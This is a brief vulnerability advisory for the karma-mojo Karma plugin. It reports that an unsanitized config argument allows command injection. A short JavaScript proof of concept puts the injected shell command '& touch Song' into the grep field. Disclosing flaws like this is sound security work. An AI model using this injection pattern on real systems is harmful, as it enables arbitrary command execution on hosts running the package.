# Overview
`karma-mojo` is a plugin for Karma that provides a binary for running only a select subset of tests at a time instead of running the whole test suite.

This package are vulnerable to Command Injection, the argument config can be controlled by users without any sanitization.

# Proof of Concept
```
var root = require("karma-mojo");
var config = {
   runnerPath: './karma.log',
  grep: "\"& touch Song\"",
  grepDir:"",
  length: 1
}
root['reporter:mojo'][1]('',config, '', {'create': function(){}});
```